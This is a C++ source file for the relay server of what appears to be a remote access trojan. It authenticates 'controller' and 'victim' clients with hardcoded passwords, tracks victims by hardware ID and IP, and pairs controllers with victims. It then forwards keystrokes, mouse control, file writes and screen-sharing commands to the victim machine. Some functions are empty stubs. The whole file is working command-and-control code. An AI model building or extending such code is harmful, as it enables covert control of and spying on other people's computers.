#include "server.h"
#include <iostream>
#include <thread>
#include <fstream>

Server::Server()
{
	//create database file if it doesnt already exist
	std::ifstream databaseFile(SERVER_FILES_PATH "/database.txt");
	std::string line;
	while (std::getline(databaseFile, line))
		database[line.substr(0, line.find_first_of('-'))] = line.substr(line.find_first_of('-') + 1);
	databaseFile.close();

	//add new line in the log file
	std::ofstream logs(SERVER_FILES_PATH "/logs.log", std::ios::app);
	logs.seekp(0, std::ios::end);
	if (logs.tellp() != 0)
		logs << "\n";
	logs.close();

	//start listening to the port. if it fails, exit
	if (listener.listen(SERVER_PORT) != sf::Socket::Done) {
		writeLog("listening on port " + std::to_string(SERVER_PORT) + " failed");
		std::exit(-1);
	}
	selector.add(listener);
	writeLog("started listening on port " + std::to_string(SERVER_PORT));

	//start thread that checks if client are not asleep
	std::thread checkAwakeThread(&Server::checkAwake, this);
	checkAwakeThread.detach();
}
void Server::receive()
{
	//wait until a client has sent something
	if (!selector.wait())
		return;

	//lock mutex used for clients access
	mutex.lock();

	std::vector<sf::Uint16> idsToKill, idsToDisc;

	//check if a client has received something
	for (auto& c : clients) {
		//look for the socket that has received something
		if (!selector.isReady(*c.second.socket))
			continue;

		//receive packet from client
		sf::Packet p;
		c.second.socket->receive(p);

		//disconnect client if packet is invalid
		if (p.getDataSize() == 0) {
			if (c.second.role == '-')
				writeLog(std::to_string(c.first) + " disconnected without initializing");
			else
				writeLog(std::to_string(c.first) + " disconnected");

			disconnect(c.first);
			break;
		}

		//update time last message not mark as not-afk
		c.second.lastMsg = std::chrono::duration_cast<std::chrono::milliseconds>
			(std::chrono::system_clock::now().time_since_epoch()).count();

		//process the packet if it was received by a controller
		if (c.second.role == 'c')
			processControllerMsg(c.first, p, idsToKill, idsToDisc);
		//process the packet if it was received by a victim
		else if (c.second.role == 'v')
			processVictimMsg(c.first, p, idsToDisc);
		//process the packet if it was received by an uninitialized client
		else if (c.second.role == '-') {
			//get the client's role and name
			sf::Uint8 wantedRole;
			p >> wantedRole;

			//add new controller or victim to the list
			if (wantedRole == 'c' || wantedRole == 'v') {
				//version mis-match
				std::string rolePass;
				p >> rolePass;
				if (rolePass != ((wantedRole == 'c') ? CONTROLLER_PASS : VICTIM_PASS)) {
					p.clear();
					p << sf::Uint8('<');
					c.second.socket->send(p);

					//parse next message
					continue;
				}

				//retrieve hardware id
				p >> c.second.hardwareId;
				bool alreadySeenClient = database.count(c.second.hardwareId);
				if (alreadySeenClient) {
					char banStatus = database[c.second.hardwareId][0];

					if (wantedRole == banStatus || banStatus == 'b') {
						p.clear();
						p << sf::Uint8('#');
						c.second.socket->send(p);

						//parse next message
						continue;
					}
				}
				//register the new client
				else {
					database[c.second.hardwareId] = "nno name";
					saveDatabase();
				}

				//tell the client that it has been initialized
				p.clear();
				p << sf::Uint8(wantedRole);
				//controllers need to know their id too
				if (wantedRole == 'c')
					p << sf::Uint16(c.first);
				c.second.socket->send(p);
				c.second.role = wantedRole;

				auto ip = c.second.socket->getRemoteAddress().toString() + ":" + 
					std::to_string(c.second.socket->getRemotePort());
				writeLog(std::to_string(c.first) + " = " + std::string(1, wantedRole) + 
					(alreadySeenClient ? " - " : " (new) - ") + ip + " - " + c.second.hardwareId);

				updateControllersList();
			}
			//tell the client that the command received wasn't valid
			else {
				p << sf::Uint8('?');
				c.second.socket->send(p);
			}
		}
	}
	//cycle through ids to kill and kill them
	for (const auto id : idsToKill) {
		writeLog(std::to_string(id) + " killed");
		disconnect(id);
	}
	//cycle through ids to disconnect and disconnect them
	for (const auto id : idsToDisc) {
		writeLog(std::to_string(id) + " encountered a problem");
		disconnect(id);
	}

	//check if a client is ready to connect
	if (selector.isReady(listener)) {
		Client c;
		//add new client to list
		if (listener.accept(*c.socket) == sf::Socket::Done) {
			selector.add(*c.socket);
			clients.insert({ ++currentId, c });
		}
		//undo if client isn't accepted successfully
		else {
			delete c.socket;
			currentId--;
		}
	}

	//unlock mutex used for clients access
	mutex.unlock();
}
void Server::checkAwake()
{
	while (true) {
		//mutex used for clients access
		mutex.lock();
		//flag clients as afk if needed
		std::vector<sf::Uint16> idsToRemove;
		for (const auto& c : clients) {
			//if more than 5 seconds are passed since last msg, client is afk
			if (std::chrono::duration_cast<std::chrono::milliseconds>(std::chrono::system_clock::now().time_since_epoch()).count() - c.second.lastMsg > 5'000)
				idsToRemove.push_back(c.first);
		}

		//disconnect afk clients
		for (auto id : idsToRemove) {
			if (clients[id].role == '-')
				writeLog(std::to_string(id) + " timed out without initializing");
			else
				writeLog(std::to_string(id) + " timed out");

			disconnect(id);
		}
		mutex.unlock();

		//sleep to save processing power
		std::this_thread::sleep_for(std::chrono::milliseconds(200));
	}
}

void Server::processControllerMsg(sf::Uint16 id, sf::Packet p, 
	std::vector<sf::Uint16>& idsToKill, std::vector<sf::Uint16>& idsToDisc)
{
	sf::Uint8 cmd;
	p >> cmd;

	//pair controller with victim
	if (cmd == 'p') {
		sf::Uint16 vId;
		p >> vId;
		//controller is already paired
		if (clients[id].pair != 0)
			return;
		//other client doesn't exist
		if (clients.find(vId) == clients.end())
			return;
		//other client is not a victim or is already paired
		if (clients[vId].role != 'v' || clients[vId].pair != 0)
			return;

		p.clear();
		p << sf::Uint8('p');
		//tell controller that is has been paired
		clients[id].socket->send(p);

		//actually pair the 2 clients
		clients[vId].pair = id;
		clients[id].pair = vId;

		updateControllersList();
	}
	//forward events to victim
	//key pressed-released, mouse moved, wheel scrolled, start-stop keyboard control, start-stop mouse control, create-write-close file, start-stop screen sharing
	else if (cmd == 'm' || cmd == 'n' || cmd == 'l' || cmd == 'k' || cmd == 'a' || cmd == 'z' || cmd == 's' || 
		cmd == 'x' || cmd == 'f' || cmd == 'o' || cmd == 'i' || cmd == 'h' || cmd == 'b' || cmd == 'g') {

		//controller is not paired
		if (clients[id].pair == 0) {
			idsToDisc.push_back(id);
			return;
		}

		clients[clients[id].pair].socket->send(p);
	}
	//unpair a client (admin checked later)
	else if (cmd == 'u') {
		sf::Uint16 otherId;
		p >> otherId;
		//other client doesn't exist
		if (clients.find(otherId) == clients.end())
			return;
		//other client is not paired
		if (clients[otherId].pair == 0 || clients[otherId].role == '-')
			return;

		//check if controller has permissions
		if (!clients[id].isAdmin && id != otherId)
			return;

		sf::Uint16 vId = 0, cId = 0;
		if (clients[otherId].role == 'c')
			vId = clients[otherId].pair, cId = otherId;
		if (clients[otherId].role == 'v')
			cId = clients[otherId].pair, vId = otherId;

		sf::Packet p;
		p << sf::Uint8('u');
		//tell controller to unpair
		clients[cId].socket->send(p);

		//stop keyboard control
		p.clear();
		p << sf::Uint8('z');
		clients[vId].socket->send(p);
		//stop mouse control
		p.clear();
		p << sf::Uint8('x');
		clients[vId].socket->send(p);

		//actually unpair the 2 clients
		clients[vId].pair = 0;
		clients[cId].pair = 0;

		updateControllersList();
	}
	//disconnect a given client
	else if (cmd == 'e' && clients[id].isAdmin) {
		sf::Uint16 oId;
		p >> oId;

		//client doesn't exist
		if (clients.find(oId) == clients.end())
			return;
		//client isn't initialized
		if (clients[oId].role == '-')
			return;

		p.clear();
		p << sf::Uint8('e');
		//tell the client to kill himself
		clients[oId].socket->send(p);

		idsToKill.push_back(oId);
	}
	//rename a given client
	else if (cmd == 'w' && clients[id].isAdmin) {
		sf::Uint16 oId;
		std::string name;
		p >> oId >> name;

		//client doesn't exist
		if (clients.find(oId) == clients.end())
			return;
		//client isn't initialized
		if (clients[oId].role == '-')
			return;

		//clients[oId].name = name;

		updateControllersList();
	}
	//grant admin to client
	else if (cmd == 'q') {
		sf::Uint16 oId;
		std::string pass;
		p >> oId >> pass;

		//client doesn't exist
		if (clients.find(oId) == clients.end())
			return;
		//client isn't initialized
		if (clients[oId].role != 'c')
			return;

		if (pass == PASS)
			clients[oId].isAdmin = true;

		updateControllersList();
	}
	//apparently controller thinks it isn't initialized
	else if (cmd == 'c' || cmd == 'v') {
		//reset connection with client
		idsToDisc.push_back(id);
	}

}
void Server::processVictimMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::Uint16>& idsToDisc)
{
	sf::Uint8 cmd;
	p >> cmd;

	//send cmds to controller
	if (cmd == 'y' || cmd == 'h' || cmd == 't') {
		//victim is not paired
		if (clients[id].pair == 0)
			return;

		clients[clients[id].pair].socket->send(p);
	}
	//apparently victim thinks it isn't initialized
	else if (cmd == 'c' || cmd == 'v') {
		//reset connection with client
		idsToDisc.push_back(id);
	}
}

void Server::disconnect(sf::Uint16 id)
{
	if (clients.find(id) == clients.end()) {
		return;
	}

	sf::Packet p;
	//unpair the paired client
	if (clients[id].pair != 0) {
		//if client is controller, tell him to unpair
		if (clients[clients[id].pair].role == 'c') {
			p.clear();
			p << sf::Uint8('u');
			clients[clients[id].pair].socket->send(p);
		}
		//if client is victim, tell his to release all keys
		else if (clients[clients[id].pair].role == 'v')
		{
			//stop keyboard control
			p.clear();
			p << sf::Uint8('z');
			clients[clients[id].pair].socket->send(p);
			//stop mouse control
			p.clear();
			p << sf::Uint8('x');
			clients[clients[id].pair].socket->send(p);
		}
		
		p.clear();
		p << sf::Uint8('h');
		clients[clients[id].pair].socket->send(p);

		//actually unpair other client
		clients[clients[id].pair].pair = 0;
	}

	//remove client from list/selector
	selector.remove(*clients[id].socket);
	delete clients[id].socket;
	clients.erase(id);

	updateControllersList();
}
void Server::updateControllersList()
{
	sf::Packet p;
	//tell the controllers how many clients are connected
	p << sf::Uint8('d') << sf::Uint16(clients.size());

	//load each client info into the packet
	for (const auto& c : clients) {
		if (c.second.role == '-')
			continue;

		std::string name = database[c.second.hardwareId].substr(1);
		p << sf::Uint8(c.second.role) << c.first << c.second.pair << name << c.second.hardwareId;
		p << c.second.socket->getRemoteAddress().toInteger() << c.second.socket->getRemotePort() << c.second.isAdmin;
	}

	//send the packet to all controllers
	for (auto& c : clients) {
		if (c.second.role != 'c')
			continue;

		c.second.socket->send(p);
	}
}

void Server::writeLog(std::string s)
{
	auto t = std::chrono::duration_cast<std::chrono::seconds>
		(std::chrono::system_clock::now().time_since_epoch()).count();

	std::ofstream logs(SERVER_FILES_PATH "/logs.log", std::ios::app);
	logs << t << ", " << s << "\n";
	logs.close();

	std::cout << t << ", " << s << "\n";
}

void Server::saveDatabase()
{
}
